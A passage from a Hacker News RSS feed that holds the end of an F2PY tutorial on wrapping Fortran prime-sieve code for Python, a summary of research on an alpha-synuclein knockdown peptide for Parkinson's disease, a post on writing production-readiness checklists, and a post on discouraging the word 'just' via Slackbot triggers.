in multidimensional matrices. That is, linear algebra in general. Other good examples could be programs
calculating integrals or conducting Monte Carlo simulations.
At this point, you might wonder if anyone has already made F2PY-modules fitting your particular
problem. The answer is most likely yes! Most of the functions and routines found in NumPy and SciPy
are actually compiled Fortran (or C/C++) routines which provide highly efficient and fast solvers for
multiple problems. We thus advice you to always check if one of these two packages/libraries already
provide a routine in which may be suitable for your problem. If not, you should first implement your
solver in a pure Python script to investigate whether or not computational efficiency really is an issue. If
it is, then F2PY may possibly provide the best solution strategy for your problem.</p>
<h2 id="getting-started">Getting started</h2>
<p>We will be considering a simple example in which the <a href="https://en.wikipedia.org/wiki/Sieve_of_Eratosthenes">sieve of Eratosthenes</a> algorithm is used to compute prime numbers. The Fortran code is saved in <code>primes.f95</code>. <strong>Note</strong> that the code only includes <code>subroutines</code> and that the variables are defined with a new keyword <code>intent</code>. The latter is explained in the next section.</p>
<div><pre><span></span><span>subroutine </span><span>sieve</span><span>(</span><span>is_prime</span><span>,</span> <span>n_max</span><span>)</span>
<span>! =====================================================</span>
<span>! Uses the sieve of Eratosthenes to compute a logical</span>
<span>! array of size n_max, where .true. in element i</span>
<span>! indicates that i is a prime.</span>
<span>! =====================================================</span>
    <span>integer</span><span>,</span> <span>intent</span><span>(</span><span>in</span><span>)</span>   <span>::</span> <span>n_max</span>
    <span>logical</span><span>,</span> <span>intent</span><span>(</span><span>out</span><span>)</span>  <span>::</span> <span>is_prime</span><span>(</span><span>n_max</span><span>)</span>
    <span>integer</span> <span>::</span> <span>i</span>
    <span>is_prime</span> <span>=</span> <span>.</span><span>true</span><span>.</span>
    <span>is_prime</span><span>(</span><span>1</span><span>)</span> <span>=</span> <span>.</span><span>false</span><span>.</span>
    <span>do </span><span>i</span> <span>=</span> <span>2</span><span>,</span> <span>int</span><span>(</span><span>sqrt</span><span>(</span><span>real</span><span>(</span><span>n_max</span><span>)))</span>
        <span>if</span> <span>(</span><span>is_prime</span> <span>(</span><span>i</span><span>))</span> <span>is_prime</span> <span>(</span><span>i</span> <span>*</span> <span>i</span> <span>:</span> <span>n_max</span> <span>:</span> <span>i</span><span>)</span> <span>=</span> <span>.</span><span>false</span><span>.</span>
    <span>end do</span>
<span>    return</span>
<span>end subroutine</span>

<span>subroutine </span><span>logical_to_integer</span><span>(</span><span>prime_numbers</span><span>,</span> <span>is_prime</span><span>,</span> <span>num_primes</span><span>,</span> <span>n</span><span>)</span>
<span>! =====================================================</span>
<span>! Translates the logical array from sieve to an array</span>
<span>! of size num_primes of prime numbers.</span>
<span>! =====================================================</span>
    <span>integer</span>                 <span>::</span> <span>i</span><span>,</span> <span>j</span><span>=</span><span>0</span>
    <span>integer</span><span>,</span> <span>intent</span><span>(</span><span>in</span><span>)</span>     <span>::</span> <span>n</span>
    <span>logical</span><span>,</span> <span>intent</span><span>(</span><span>in</span><span>)</span>     <span>::</span> <span>is_prime</span><span>(</span><span>n</span><span>)</span>
    <span>integer</span><span>,</span> <span>intent</span><span>(</span><span>in</span><span>)</span>     <span>::</span> <span>num_primes</span>
    <span>integer</span><span>,</span> <span>intent</span><span>(</span><span>out</span><span>)</span>    <span>::</span> <span>prime_numbers</span><span>(</span><span>num_primes</span><span>)</span>
    <span>do </span><span>i</span> <span>=</span> <span>1</span><span>,</span> <span>size</span><span>(</span><span>is_prime</span><span>)</span>
        <span>if</span> <span>(</span><span>is_prime</span><span>(</span><span>i</span><span>))</span> <span>then</span>
<span>            </span><span>j</span> <span>=</span> <span>j</span> <span>+</span> <span>1</span>
            <span>prime_numbers</span><span>(</span><span>j</span><span>)</span> <span>=</span> <span>i</span>
        <span>end if</span>
<span>    end do</span>
<span>end subroutine</span>
</pre></div>


<p>The simplest way to wrap this subroutine to python is to run </p>
<div><pre><span></span>f2py -c primes.f95 -m primes
</pre></div>


<p>Now that F2PY is a part of Numpy, an equivalent way to wrap this subroutine is to run</p>
<div><pre><span></span>python -m numpy.f2py -c primes.f95 -m primes
</pre></div>


<p><strong>Note</strong> that you might need to run <code>f2py3</code> to use Python 3! This command builds (<code>-c</code> flag) an extension module <code>primes.so</code> to the current directory. If the <code>-m</code> flag is excluded, the extension module will be named <code>untitled.so</code>. </p>
<p>We can now access these subroutines from Python:</p>
<div><pre><span></span><span>&gt;&gt;&gt; </span><span>import</span> <span>primes</span>
<span>&gt;&gt;&gt; </span><span>print</span><span>(</span><span>primes</span><span>.</span><span>__doc__</span><span>)</span>
<span>This module 'primes' is auto-generated with f2py (version:2).</span>
<span>Functions:</span>
<span>  is_prime = sieve(n_max)</span>
<span>  prime_numbers = logical_to_integer(is_prime,num_primes,n=len(is_prime))</span>
<span>.</span>
<span>&gt;&gt;&gt; </span><span>print</span><span>(</span><span>primes</span><span>.</span><span>logical_to_integer</span><span>.</span><span>__doc__</span><span>)</span>
<span>prime_numbers = logical_to_integer(is_prime,num_primes,[n])</span>

<span>Wrapper for ``logical_to_integer``.</span>

<span>Parameters</span>
<span>----------</span>
<span>is_prime : input rank-1 array('i') with bounds (n)</span>
<span>num_primes : input int</span>

<span>Other Parameters</span>
<span>----------------</span>
<span>n : input int, optional</span>
<span>    Default: len(is_prime)</span>

<span>Returns</span>
<span>-------</span>
<span>prime_numbers : rank-1 array('i') with bounds (num_primes)</span>

<span>&gt;&gt;&gt; </span><span>sieve_array</span> <span>=</span> <span>primes</span><span>.</span><span>sieve</span><span>(</span><span>100</span><span>)</span>
<span>&gt;&gt;&gt; </span><span>prime_numbers</span> <span>=</span> <span>primes</span><span>.</span><span>logical_to_integer</span><span>(</span><span>sieve_array</span><span>,</span> <span>sum</span><span>(</span><span>sieve_array</span><span>))</span>
<span>&gt;&gt;&gt; </span><span>print</span><span>(</span><span>prime_numbers</span><span>)</span>
<span>[ 2  3  5  7 11 13 17 19 23 29 31 37 41 43 47 53 59 61 67 71 73 79 83 89 97]</span>
</pre></div>


<p>Note that F2PY automatically found that the last argument (<code>n</code>) of the <code>logical_to_integer</code> subroutine was the dimension of the input array <code>is_prime</code>. F2PY concluded that <code>n</code> can be optional, with the default value <code>len(is_prime)</code>! One can use different values for the optional argument <code>n</code>. However, an exception is raised when it is incompatible with <code>is_prime</code>.</p>
<h2 id="specifying-input-and-output-arguments">Specifying input and output arguments</h2>
<p>In the example above, the different arguments of the subroutine were defined as input or output using the <code>intent()</code> attribute. The three most useful are:</p>
<ul>
<li><code>intent(in)</code> specifies that the variable is an input argument. It cannot be changed within the subroutine.</li>
<li><code>intent(out)</code> specifies that the variable is an output argument. The values stored in the variable before the routine is called is irrelevant!</li>
<li><code>intent(inout)</code> specifies that the variable is an input argument and can be changed in the subroutine.</li>
</ul>
<p>If <code>intent</code> is excluded, the arguments become input-only arguments (same as using <code>intent(inout)</code>) by default. It is considered good practice to specify all arguments using the <code>intent</code> attribute. It is also preferred to use <code>intent(out)</code> (and not <code>intent(inout)</code>) to have a returned value.</p>
<p>The intent and optionality of the arguments can also be edited manually in the signature file <code>primes.pyf</code> generated by running</p>
<div><pre><span></span>f2py primes.f95 -m primes -h primes.pyf
</pre></div>


<p>The final module is built from the signature file by running</p>
<div><pre><span></span>f2py -c primes.pyf primes.f95
</pre></div>


<p>The attributes can also be specified as comments, which is done in our <a href="https://nbviewer.jupyter.org/urls/www.numfys.net/media/notebooks/fortran_to_python.ipynb">Calling Fortran(95) routines from a Python Script</a> notebook.</p>
<p>Check out the <a href="https://docs.scipy.org/doc/numpy/f2py/signature-file.html">documentation for the signature file</a> for more options.</p>
<h2 id="pitfalls">Pitfalls</h2>
<ul>
<li>F2PY is compatible with the allocatable arrays in Fortran 90 and above. However, all output arguments must be given dimensions explicitly! In other words, output arguments cannot be of assumed size or allocatable.
For example:</li>
</ul>
<div><pre><span></span><span>integer</span><span>,</span> <span>allocatable</span><span>,</span> <span>intent</span><span>(</span><span>out</span><span>)</span> <span>::</span> <span>array1</span><span>(:)</span>  <span>! Not valid</span>
<span>integer</span><span>,</span> <span>intent</span><span>(</span><span>out</span><span>)</span>              <span>::</span> <span>array2</span><span>(:)</span>  <span>! Not valid</span>
<span>integer</span><span>,</span> <span>intent</span><span>(</span><span>out</span><span>)</span>              <span>::</span> <span>array3</span><span>(</span><span>10</span><span>)</span> <span>! Valid</span>
<span>integer</span><span>,</span> <span>intent</span><span>(</span><span>in</span><span>)</span>               <span>::</span> <span>array4</span><span>(:)</span>  <span>! Valid</span>
</pre></div>


<ul>
<li>Derived types are not supported.</li>
<li>It should be noted that it, in general, is easier to run F2PY from a UNIX based computer system. There is a lot of troubleshooting on Windows available online, but from our experience getting F2PY to work as intended was way easier using Linux or MacOS.</li>
</ul>
<h2 id="custom-docstrings">Custom docstrings</h2>
<p>As we have seen, F2PY creates a default documentation for the module and functions which can be reached using e.g. <code>help()</code> or <code>.__doc__</code>. As far as we know, there are no options in F2PY in which we can modify this documentation. However, it can be changed upon import (<code>&lt;module&gt;.__doc__=&lt;string&gt;</code>)
or one create a python function with its own (custom) docstring which calls the module. Many of <a href="https://www.scipy.org/">SciPy's</a> modules are built using F2PY, and their docstring are created using the latter method.</p>
    </div></div>]]>
            </description>
            <link>https://www.numfys.net/howto/F2PY/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26222664</guid>
            <pubDate>Mon, 22 Feb 2021 09:58:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Development of an α-synuclein knockdown peptide for Parkinson’s disease]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26222649">thread link</a>) | @JPLeRouzic
<br/>
February 22, 2021 | https://padiracinnovation.org/News/2021/02/development-of-an-a-synuclein-knockdown-peptide-and-evaluation-of-its-efficacy-in-parkinsons-disease-models | <a href="https://web.archive.org/web/*/https://padiracinnovation.org/News/2021/02/development-of-an-a-synuclein-knockdown-peptide-and-evaluation-of-its-efficacy-in-parkinsons-disease-models">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    						
					                    <p>
                        <span itemprop="datePublished">22 February 2021</span> - Posted in 
                        <span itemprop="articleSection"><a href="https://padiracinnovation.org/News/category/english">English</a></span> by 
                        
                    </p>
                </div><div itemprop="articleBody">                                   
                    <p>Parkinson’s disease (Parkinson’s disease) is a major neurodegenerative disorder. It currently lacks a clinically relevant treatment that can directly target the disease-causing processes. Current clinical approaches, like deep brain stimulation and pharmacological treatments with levodopa and dopamine agonists, only relieve symptoms. The efficacy of these treatments is largely limited by their undesirable complications and side effects. 
<img src="https://upload.wikimedia.org/wikipedia/commons/0/0f/Lewy_Body_alphaSynuclein.jpg" alt="enter image description here">
<em>Source: By Ajpolino via Wikipedia</em></p>

<p>Since α-synuclein is overexpressed under certain pathological conditions of PD and these upregulated proteins can interfere with many physiological processes, such as ER-to-Golgi transport, synaptic transmission, and mitochondria function and morphology, robustly knocking down the overexpressed α-synucleinmay have better neuroprotective efficacy in restoring normal cellular functions in the Parkinson’s disease brain than simply inhibiting the formation of toxic α-synuclein oligomers.</p>

<p>Knockdown of α-synuclein using genetic manipulations, such as antisense oligonucleotide and small interfering RNA (siRNA), has shown protection of dopaminergic neurons in various models of Parkinson’s disease.</p>

<p>The clinical translation of these manipulations into an efficient Parkinson’s disease therapy has however costly and uncomfortable, as it is mainly accomplished by an invasive injection or viral infection. These technologies may not be clinically practical for therapeutic use in human patients.</p>

<p><a href="https://www.nature.com/articles/s42003-021-01746-6">Here the scientists report the development of a short, BBB and plasma membrane-permeant synthetic peptide that can rapidly reduce endogenous α-synuclein via proteasomal degradation.</a></p>

<p>Using both in vitro and in vivo models of Parkinson’s disease, the scientists provide proof-of-principle evidence for using this small α-synuclein knockdown peptide as a potential Parkinson’s disease therapy.</p>

<p>The authors first demonstrated that the Tat-βsyn-degron peptide can specifically reduce the level of α-synuclein both in vitro and in vivo. The authors then showed that the peptide-induced α-synuclein knockdown is associated with protection of dopaminergic neurons against toxin-induced damage in a culture model of Parkinson’s disease.</p>

<p>Most importantly, the scientists were able to demonstrate the therapeutic potential of systemic application of the Tat-βsyn-degron peptide as an effective Parkinson’s disease treatment in two well-characterized animal models of Parkinson’s disease.</p>

<p>Their α-synuclein knockdown peptide (Tat-βsyn-degron) is innovative as the peptide directly targets one of the disease-causing processes, and can be expected to stop or slow down the progression of the disease.</p>

<p>In addition, the peptide-mediated knockdown has a clear temporal advantage over antisense or siRNA-mediated knockdown. α-synuclein is a very stable protein with a long half-life while by hijacking the endogenous proteasomal degradation system in the cell, the Tat-βsyn-degron peptide produced a rapid and robust degradation of α-synuclein protein within a few hours.</p>

<p>It is also interesting to note that α-synuclein is also expressed in tissues outside the central nervous system and the scientists found that a single intraperitoneal injection of the Tat-βsyn-degron peptide similarly reduced the α-synuclein expression in the kidney and the spleen of wild-type C57BL/6 mice .</p>

<p>A recent success in a phase 3 clinical trial has already demonstrated that a Tat-fused short peptide is not only safe, but therapeutically effective in protecting neurons against ischemic damage in humans. The authors hope this α-synuclein knockdown peptide may also have the potential to be quickly translated into the clinic as an effective disease-modifying treatment that directly targets the disease-causing process of Parkinson’s disease.</p>

<p>Due to the versatility of their peptide-mediated protein knockdown method, the scientists can theoretically target disease-causing cellular proteins by simply changing the protein-binding sequence of the targeting peptide. Since many human diseases, including some of the age-related neurodegenerative diseases such as ALS, Alzheimer’s disease and Huntington’s disease, are pathologically caused by gain of function of a protein due to its mutations and/or increased expression levels, <strong>the proposed study can be expected to spur the development of new therapeutics for human diseases beyond Parkinson’s disease</strong>.</p>

<h3><u>Advertisement</u></h3>

<p><a href="https://www.amazon.com/dp/1698147899">
<img src="https://images-na.ssl-images-amazon.com/images/I/51pNZDKvmIL._SX331_BO1,204,203,200_.jpg" width="200">
<br>
This book retraces the main achievements of ALS research over the last 30 years, presents the drugs under clinical trial, as well as ongoing research on future treatments likely to be able stop the disease in a few years and to provide a complete cure in a decade or two.<br>
</a></p>
                </div></div>]]>
            </description>
            <link>https://padiracinnovation.org/News/2021/02/development-of-an-a-synuclein-knockdown-peptide-and-evaluation-of-its-efficacy-in-parkinsons-disease-models</link>
            <guid isPermaLink="false">hacker-news-small-sites-26222649</guid>
            <pubDate>Mon, 22 Feb 2021 09:57:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Make a Production Checklist]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26222608">thread link</a>) | @vinnyglennon
<br/>
February 22, 2021 | Https://www.blameless.com/blog/4-things-you-need-to-know-about-writing-better-production-readiness-checklists | <a href="https://web.archive.org/web/*/Https://www.blameless.com/blog/4-things-you-need-to-know-about-writing-better-production-readiness-checklists">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>When we think of reliability tools, we may overlook the humble checklist. While tools like <a href="https://www.blameless.com/blog/service-level-objectives-slos-lessons-learned">SLOs</a> represent the cutting edge of SRE, checklists have been recommended in many industries such as <a href="https://dash.harvard.edu/handle/1/38846186">surgery</a> and <a href="https://www.flightsafetyaustralia.com/2018/11/one-thing-at-a-time-a-brief-history-of-the-checklist/">aviation</a> for almost a century. But checklists owe this long and widespread adoption to their usefulness.<br></p><p>Checklists can also help limit errors when deploying code to production. In this blog post, we’ll cover:</p><ul role="list"><li>How to make a production checklist</li><li>Why production checklists are helpful</li><li>Keeping your checklist up to date</li><li>How Blameless can help integrate your checklists</li></ul><h2>How to make a production checklist</h2><p>Production checklists should be holistic. They should cover everything from launch logistics to contingency plans for failure. Let’s break down what you’ll need for a thorough checklist.</p><ol role="list"><li><strong>Determine the service level of what you’re launching</strong></li></ol><p>To determine <em>how thorough</em> your checklist should be, consider what level of reliability your customers need.. You may be tempted to be as comprehensive as possible with every checklist, but that costs time and may be unnecessary. At Mercari, <a href="https://github.com/mercari/production-readiness-checklist/blob/master/docs/references/production-readiness-level.md">the service level is determined based on the service’s SLO</a>. Services that are critical to business success are scrutinized more than niche services.</p><ol start="2" role="list"><li><strong>Map out all the checklist areas</strong></li></ol><p>List all major components of your service. These components may be under the ownership of various teams. For example, you’ll likely need to consult server management teams, testing teams, and many others. It’s important to know as soon as possible whom you’ll need to consult. Some areas to consider include:<br></p><ul role="list"><li><strong>Server-side:</strong> What machines will this service run on? If you’re cloud-based, will your plan cover the new service’s load?</li><li><strong>Client-side:</strong> Is your service usable for all potential clients?</li><li><strong>Monitoring:</strong> Do you have ways of collecting data from your new service?&nbsp;</li><li><strong>Growth:</strong> Do you have a roadmap for how you will maintain or improve the service going forward? What if usage increases? What if you need to expand functionality?</li><li><strong>Dependencies:</strong> What other in-house and third party services does your service depend on? Will they integrate smoothly?</li><li><strong>Testing:</strong> Has the new service been tested in an environment mirroring production?</li><li><strong>Security: </strong>Will your new service pass your security audits?</li><li><strong>Reliability: </strong>What level of reliability will your users expect? Do you have a plan for when you are unable to meet these expectations?</li><li><strong>Incident response:</strong> What will you do if an incident causes service interruption or degradation? Do you have runbooks to cover these incidents?</li><li><strong>Legal:</strong> Do you have an SLA that guarantees availability? Does this service deal with personal information that must be kept secure?</li><li><strong>Logistics:</strong> What is the launch schedule? What resources will you need?<br></li></ul><p>For more examples of areas to consider, check out Google’s <a href="https://sre.google/sre-book/launch-checklist/">Launch Coordination Checklist</a>, <a href="https://gruntwork.io/devops-checklist/">gruntwork.io’s AWS checklist</a>, or <a href="https://github.com/mercari/production-readiness-checklist/blob/master/docs/references/production-readiness-checklist.md">Mercari’s checklists</a>.</p><ol start="3" role="list"><li><strong>Prepare the checklist items</strong></li></ol><p>Each of these areas contains many issues, and requires data to answer. Your checklist should ask for each piece of data. Here’s an example of how certain sections could be broken down:<br></p><figure><p><img src="https://uploads-ssl.webflow.com/5ec0224560bd6a6ef89a51ae/60258a189045532048064bce_GXLhui7pRZ_R7zLCqUunWS6CCU7PBwExUev_Aayj1ioz3UDZtZHnvyMOZNAsbRp1eugg8OC6Wjyl38autUOS0tlRm_wJkM3HjmEehUg3V1jnHf5gmUg-1ZX0DM0Z2G5dNlksxcM.png" alt="example areas, issues, and corresponding checklist items for a production readiness checklist."></p></figure><p>You may also want to include information on who to consult to check off each item, and the timeframe for being able to check it. Build your checklist and check items off as development progresses. Double check to ensure that items are ready to go. Right before launch, do a final check through the whole list, just in case.</p><h3>Keeping the checklist in check</h3><p>As you develop, you’ll likely find more areas you want to vet prior to launch. To keep your checklist from becoming too long, you’ll need a system to make sure new additions are helpful. <a href="https://sre.google/sre-book/reliable-product-launches/">At Google</a>, teams have two criteria for adding an item to the checklist:<br></p><ul role="list"><li>“Every question’s importance must be substantiated, ideally by a previous launch disaster.”</li><li>“Every instruction must be concrete, practical, and reasonable for developers to accomplish.”<br></li></ul><p>You can determine criteria based on the service level you’ve assigned. It’s better to have an unnecessary item than to lack one you need. It’s okay to start with a big checklist, then remove items after each launch that proved to not be useful.</p><h2>Why are production checklists helpful?</h2><p>Production checklists can seemingly add overhead to engineers’ jobs. However, the upfront work can save teams from future problems and ensure a successful launch. Production checklists help:<br></p><ul role="list"><li>Remove the cognitive toil of having to remember everything</li><li>Identify possible problems ahead of time</li><li>Prepare resources ahead of time</li><li>Motivate development to complete necessary items</li><li>Prioritize key requirements vs unnecessary additions</li><li>Ensure contingency planning, improving reliability</li><li>Keep everyone in the loop throughout development as a centralized progress meter</li></ul><h2>How to keep your production checklist up to date</h2><p>You will need to review and revise your checklists periodically to keep them useful. Be sure to revisit them at these times:<br></p><p><strong>When development on a new service starts. </strong>When mapping out a new service, consider which production checklist to use when it launches. Based on the type of service and service level, find the closest checklist you have. Review it to make sure it follows the processes and architecture you currently use. Add any service-specific requirements as you develop.<br></p><p><strong>After a launch.</strong> Take a look at the production checklist after you launch the new service. Were there any problems with the launch? Could they have been checked for beforehand? Look for checklist items that were misunderstood and filled out incorrectly. Revise these items to ensure the checklist lines up with the reality of development.<br></p><p><strong>After an incident. </strong>If an incident impacts the new service, see if any of the contributing factors could have been addressed with the checklist If so, try to capture those items on future checklists. This task can be incorporated into your <a href="https://www.blameless.com/blog/incident-retrospective-postmortem-template">incident retrospectives</a>.<br></p><p><strong>As part of regular review cycles.</strong> Set a schedule to review tools like runbooks and production checklists. Make sure to invite all team members who will be required to use these runbooks or checklists. Each of these people can provide insight on what to improve moving forward.</p><h2>How Blameless can help integrate checklists</h2><p>To get the most from your checklists, you need to integrate them into your workflows. Here’s how Blameless can help:<br></p><ul role="list"><li><a href="https://www.blameless.com/product/incident-resolution">Blameless Incident Resolution</a> allows teams to treat each deploy like an incident and assign roles and checklists.</li><li><a href="https://www.blameless.com/product/incident-retrospectives">Blameless Incident Retrospectives</a> provide a hub of learning for future checklist development.</li><li><a href="https://www.blameless.com/blog/introducing-blameless-runbook-documentation">Blameless Runbook Documentation</a> helps richly document processes, allowing you to dive into the information behind each checklist item.<br></li></ul><p>To see more of how Blameless helps you be your most reliable, check out a <a href="https://www.blameless.com/schedule-demo">demo</a>.<br></p><p>If you enjoyed this blog post, check out these resources:</p><ul role="list"><li><a href="https://www.blameless.com/blog/how-mercari-scales-vision-culture-reliability">How Mercari Scales Vision, Culture, &amp; Reliability</a></li><li><a href="https://www.blameless.com/blog/use-blameless-power-remote-work">How We Use Blameless to Power Remote Deploys</a></li><li><a href="https://www.blameless.com/resources/webinar-how-slos-enable-fast-reliable-application-delivery">Webinar: How SLOs Enable Fast, Reliable Application Delivery</a></li></ul></div></div>]]>
            </description>
            <link>Https://www.blameless.com/blog/4-things-you-need-to-know-about-writing-better-production-readiness-checklists</link>
            <guid isPermaLink="false">hacker-news-small-sites-26222608</guid>
            <pubDate>Mon, 22 Feb 2021 09:52:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Avoid the Most Dangerous Word in Software Development]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26222529">thread link</a>) | @pawurb
<br/>
February 22, 2021 | https://pawelurbanek.com/dangerous-word-slack | <a href="https://web.archive.org/web/*/https://pawelurbanek.com/dangerous-word-slack">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div role="main">
<div>

<p><span>Share</span>
<a href="https://twitter.com/intent/tweet?text=How+to+Avoid+the+Most+Dangerous+Word+in+Software+Development&amp;url=https%3A%2F%2Fpawelurbanek.com%2Fdangerous-word-slack" rel="nofollow noopener noreferrer" target="_blank">
<img title="Share on Twitter" src="https://pawelurbanek.com/assets/twitter-9863fdece66492f803e15e512e1f2d16ddd1bfad52e97104245b973e55ec0343.png" srcset="https://pawelurbanek.com/assets/twitter-9863fdece66492f803e15e512e1f2d16ddd1bfad52e97104245b973e55ec0343.png 1x, https://pawelurbanek.com/assets/twitter@2x-bb4de08ef7390cb0e6bc0e4c74d50e098821cd7c55f1c6b20560a7a325d29164.png 2x">
</a>
<a href="https://facebook.com/sharer.php?u=https%3A%2F%2Fpawelurbanek.com%2Fdangerous-word-slack" rel="nofollow noopener noreferrer" target="_blank">
<img title="Share on Facebook" alt="Share on Facebook" src="https://pawelurbanek.com/assets/facebook-ebff27bfb5f4575cf52588bae9aaa3e9d638d3ea8806983038f1f40ae5fefe17.png" srcset="https://pawelurbanek.com/assets/facebook-ebff27bfb5f4575cf52588bae9aaa3e9d638d3ea8806983038f1f40ae5fefe17.png 1x, https://pawelurbanek.com/assets/facebook@2x-0d1abc87e5ffdc544fa8f0f4282d2c01706bf15a814d794080aff2f7a87a0ffb.png 2x">
</a>
<a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fpawelurbanek.com%2Fdangerous-word-slack&amp;title=How+to+Avoid+the+Most+Dangerous+Word+in+Software+Development" rel="nofollow" target="_blank">
<img title="Share on LinkedIn" alt="Share on LinkedIn" src="https://pawelurbanek.com/assets/linkedin-fa921978de5a16810ecd5894affebee63ed33b4d74cad9637ba01c6e803de9cf.png" srcset="https://pawelurbanek.com/assets/linkedin-fa921978de5a16810ecd5894affebee63ed33b4d74cad9637ba01c6e803de9cf.png 1x, https://pawelurbanek.com/assets/linkedin@2x-b89a20f8fc3d0a82f9fe54137fbbbf4029dcc189f4dec6b9a3964b9350833e1f.png 2x">
</a>
</p>
<p><span>Share</span>
<br>
<a href="https://twitter.com/intent/tweet?text=How+to+Avoid+the+Most+Dangerous+Word+in+Software+Development&amp;url=https%3A%2F%2Fpawelurbanek.com%2Fdangerous-word-slack" rel="nofollow noopener noreferrer" target="_blank">
<img title="Share on Twitter" alt="Share on Twitter" src="https://pawelurbanek.com/assets/twitter-9863fdece66492f803e15e512e1f2d16ddd1bfad52e97104245b973e55ec0343.png" srcset="https://pawelurbanek.com/assets/twitter-9863fdece66492f803e15e512e1f2d16ddd1bfad52e97104245b973e55ec0343.png 1x, https://pawelurbanek.com/assets/twitter@2x-bb4de08ef7390cb0e6bc0e4c74d50e098821cd7c55f1c6b20560a7a325d29164.png 2x">
</a>
<br>
<a href="https://facebook.com/sharer.php?u=https%3A%2F%2Fpawelurbanek.com%2Fdangerous-word-slack" rel="nofollow noopener noreferrer" target="_blank">
<img title="Share on Facebook" alt="Share on Facebook" src="https://pawelurbanek.com/assets/facebook-ebff27bfb5f4575cf52588bae9aaa3e9d638d3ea8806983038f1f40ae5fefe17.png" srcset="https://pawelurbanek.com/assets/facebook-ebff27bfb5f4575cf52588bae9aaa3e9d638d3ea8806983038f1f40ae5fefe17.png 1x, https://pawelurbanek.com/assets/facebook@2x-0d1abc87e5ffdc544fa8f0f4282d2c01706bf15a814d794080aff2f7a87a0ffb.png 2x">
</a>
<br>
<a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fpawelurbanek.com%2Fdangerous-word-slack&amp;title=How+to+Avoid+the+Most+Dangerous+Word+in+Software+Development" rel="nofollow noopener noreferrer" target="_blank">
<img title="Share on LinkedIn" alt="Share on LinkedIn" src="https://pawelurbanek.com/assets/linkedin-fa921978de5a16810ecd5894affebee63ed33b4d74cad9637ba01c6e803de9cf.png" srcset="https://pawelurbanek.com/assets/linkedin-fa921978de5a16810ecd5894affebee63ed33b4d74cad9637ba01c6e803de9cf.png 1x, https://pawelurbanek.com/assets/linkedin@2x-b89a20f8fc3d0a82f9fe54137fbbbf4029dcc189f4dec6b9a3964b9350833e1f.png 2x">
</a>
<br>
</p>



<article>
<p><img title="Unhealthy communication on Slack is represented by a mousetrap Photo by Skitterphoto from Pexels" alt="Unhealthy communication on Slack is represented by a mousetrap Photo by Skitterphoto from Pexels" data-src="https://pawelurbanek.com/assets/slack-communication-trap-eeafc54866148ef1e14021e31975e1a8cfdab1478039b1a0685c1ea63600ef22.jpg" src="https://pawelurbanek.com/assets/slack-communication-trap-thumb-c4922c24466c80938315ab6fda7ae65192a488f1a643ccc4728839c6027bee1e.jpg">
</p>
<br>


<p><em>J-U-S-T</em>. Those four characters can be significantly detrimental to a software development process. In this blog post, I’ll describe how the <em>“just keyword”</em> can affect team’s communication and how to avoid misusing it on Slack.</p>
<h2 id="lets-just-do-it">Let’s “just” do it</h2>
<p>You’ve probably been there. Your product manager shares his brand new plan on the Slack channel:</p>
<p><em>“Why don’t we</em> <strong>just</strong> <em>add this cool new feature to our application?”</em></p>
<p>or your colleague got the wrong idea about scaling after reading a HackerNews story:</p>
<p><em>“Let’s</em> <strong>just</strong> <em>migrate our infrastructure to Kubernetes…“</em></p>
<p><em>“Just”</em> is toxic and dangerous. It implicitly suggests that the proposed task is straightforward. It undermines the discussion about the issues that might pop-up during the implementation.</p>
<p>There’s no <em>“just”</em> in software development. Most of the tasks turn out to be more complex than anticipated. <em>“Just tickets”</em> tend to drag, evolve into epics, miss deadlines and hurt the team’s motivation.</p>
<p>I’ve seen this topic discussed many times before. Make sure to check out <a href="https://alistapart.com/blog/post/the-most-dangerous-word-in-software-development/" target="_blank" rel="noopener noreferrer">these two</a> <a href="https://the-pastry-box-project.net/brad-frost/2014-january-28" target="_blank" rel="noopener noreferrer">blog posts</a> for a more in-depth description of it.</p>
<h2 id="how-to-use-slack-to-get-rid-of-just-tickets">How to use Slack to get rid of “Just tickets”</h2>
<p>I want to propose a solution to the <em>“Just”</em> problem. Lexically there’s never a need to include the word <em>“just”</em> in a sentence. You can always omit it without altering the core meaning of your message.</p>
<p>You could discourage using the word <em>“just”</em> in communication. Slack offers a simple feature that will let you automate it. Introducing Slackbot triggers:</p>
<p><img alt="Slack keyword trigger in action" title="Slack keyword trigger in action" loading="lazy" src="https://pawelurbanek.com/assets/slack-keyword-trigger-40d3219d92fe2bee0932a832ff7c80608c9b99a067f704347ed564dec917bc1e.png"></p>
<p>Slack trigger in action</p>

<p>You can configure Slack to automatically send a custom message whenever a <em>trigger</em> keyword is detected. In settings, go to <strong>Customize &gt; Slackbot</strong> and enter your desired trigger and response.
<br></p>
<p><img alt="Slack trigger settings" title="Slack trigger settings" loading="lazy" src="https://pawelurbanek.com/assets/slack-trigger-settings-3456bc59b61b75a27c245690b2d0a5d57afd8e2ac535027c9d01e3a87c54cffb.png"></p>
<p>Slack trigger settings</p>

<p>It could be pretty spammy to start with, but your team should quickly adjust and stop using the <em>forbidden</em> keyword. If someone does use it, the alert message will be a fun reminder to stop and think twice if the <em>“just”</em> idea is really that simple.</p>
<p>So why won’t you just give this communication experiment a try?</p>
<p>BTW if you’re looking for more creative ways to enhance your communication on Slack, you can check out <a href="https://abot.app/" target="_blank" rel="noopener noreferrer">Abot for anonymous messaging and polls</a>. It’s highly configurable and supports various <a href="https://abot.app/scenarios" target="_blank" rel="noopener noreferrer">usage scenarios</a>.</p>
<p><img alt="Anonymous poll conducted using Abot for Slack" title="Anonymous poll conducted using Abot for Slack" loading="lazy" src="https://pawelurbanek.com/assets/slack-anonymous-poll-bda619f03336795730c69705f61eddc8f4bac6a6bcd8deb65e83bf3ff880156d.png"></p>
